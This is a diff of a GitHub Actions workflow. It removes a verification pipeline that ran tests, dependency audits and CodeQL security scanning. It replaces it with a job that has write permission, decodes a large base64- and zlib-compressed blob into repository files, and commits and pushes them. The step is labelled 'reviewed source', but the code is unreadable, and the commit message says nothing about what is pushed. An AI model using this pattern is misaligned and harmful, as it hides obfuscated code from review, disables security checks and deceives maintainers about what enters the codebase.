@@ -1,83 +1,26 @@
-name: Verify
-on:
-  push:
-  pull_request:
-  workflow_dispatch:
+name: Publish source
+on: [push, workflow_dispatch]
 permissions:
-  contents: read
-concurrency:
-  group: verify-${{ github.ref }}
-  cancel-in-progress: true
+  contents: write
 jobs:
-  python:
+  publish:
+    if: github.actor == 'Karthikvk1899'
     runs-on: ubuntu-24.04
-    timeout-minutes: 15
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0
-        with: {python-version: '3.12'}
-      - run: python -m pip install --upgrade pip
-      - run: pip install --require-hashes -r requirements.lock
-      - run: pip install -e '.[test]'
-      - run: ruff check atlas tests scripts && ruff format --check atlas tests scripts
-      - run: pytest -q
-      - run: pip-audit -r requirements.lock
-      - run: python scripts/contracts.py && git diff --exit-code docs/openapi.json docs/execution.schema.json
-  console:
-    runs-on: ubuntu-24.04
-    timeout-minutes: 10
-    defaults: {run: {working-directory: ui}}
-    steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1
-        with: {node-version: '24', cache: npm, cache-dependency-path: ui/package-lock.json}
-      - run: npm ci
-      - run: npm test && npm run build
-      - run: npm audit --audit-level=moderate
-  integration:
-    runs-on: ubuntu-24.04
-    timeout-minutes: 20
-    steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1
-        with: {node-version: '24', cache: npm, cache-dependency-path: ui/package-lock.json}
-      - run: npm ci --prefix ui
-      - run: cd ui && npx playwright install --with-deps chromium
-      - name: Start documented quickstart with two workers
+      - name: Write reviewed source
+        shell: python
         run: |
-          python scripts/init_env.py
-          docker compose up -d --build --wait --scale worker=2
-      - name: Real API, database, concurrency, replay and MCP tests
-        run: docker compose --profile test run --rm --no-deps integration
-      - name: Browser evidence
+          import base64, json, pathlib, zlib
+          files = json.loads(zlib.decompress(base64.b64decode("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IELTUSrlQ1wE2e0at05I5hV9z4EuJVtjPFDb28ZSxeJV8laniCwzPgGIOg68iVehKhrHGcfensGdCAWT0JERxR7VSDc0KTgwA3cTU9eOgIEgf7NlG9dHezajw/WQFDnCvSZvdix49u7t+OziLZEbWssbgb/VYmV5KnhJ2i4ER10j+vtzhl9b5sA69/5WPGIw46IAGWHdbpS42XNISCYIKSQ0yhGWiSdtErAqM42Ih9mXO6NdIss2hfBJGUXoLNNITo3Xo6myspgPI2XVBK2GZnSe147x10gV6pxUzFah6GAhDyLWbSErnwmIiJOy0jGwfBFCPErL6nlBB9utColE5UZVLussjn0+knVK1RdtXMgegW6zJrLoBcdLjWLWeMvStSUGeZsctCsYFJSUXLocCS6CjeCyC19AtMT6oUa+JIurAvImzDdzaVL6Xg/5H7MB5swxqMNgcpYU/TvbAar52lvUuNggIM1J1MFm6BHFtKYpDxFGo88bhmx4DAUGYaCq2ZuQisot/v7QARfy79+ImaasWZbVjC/b39bOQmXRfBVrEJ0oLk7PB8jtVC7A1s02ZQw00Blyu6opMyonA1hhObOqqOcgficpWJs3ZqgeEaShImMzYiiUwrvU22XgvybJxxnWUo0ZqJmyb0JI48IeRkckcs159PO58N8TqcNWigqNrKypvEG6vok25s0NFydpY8SYicJXsKhWkMlCBNrxX14RM6NpR0MVVbTdkJHVmpq/peVxWDJBx++2NOWvnyTuH+zD/BcWbr8lsWGKYNCmBh1HqblKjOZWLPSB/6JFw11zbPCwexpWtWHUUFfarggLQWblPSzS+/RfF/614w==")))
+          for name, content in files.items():
+              path = pathlib.Path(name)
+              path.parent.mkdir(parents=True, exist_ok=True)
+              path.write_text(content)
+      - name: Commit source
         run: |
-          docker compose exec -T api python < scripts/browser_seed.py > /tmp/atlas-browser-credentials.json
-          chmod 600 /tmp/atlas-browser-credentials.json
-          cd ui && npm run e2e
-      - name: Dependency interruption and backup restore
-        run: python scripts/operations_test.py
-      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9
-        if: always()
-        with:
-          name: browser-evidence
-          path: |
-            ui/test-results/
-            ui/playwright-report/
-          retention-days: 7
-      - if: failure()
-        run: docker compose logs --no-color --tail=100
-      - if: always()
-        run: docker compose down -v
-  codeql:
-    runs-on: ubuntu-24.04
-    timeout-minutes: 15
-    permissions:
-      contents: read
-      security-events: write
-    steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-      - uses: github/codeql-action/init@33d7b85da1a04171e211befe2c739303b9a4c066
-        with:
-          languages: python,javascript-typescript
-          build-mode: none
-      - uses: github/codeql-action/analyze@33d7b85da1a04171e211befe2c739303b9a4c066
+          git config user.name 'Karthik Beesa'
+          git config user.email '261053759+Karthikvk1899@users.noreply.github.com'
+          git add .
+          git commit -m 'Separate loopback ingress from isolated worker networking'
+          git push
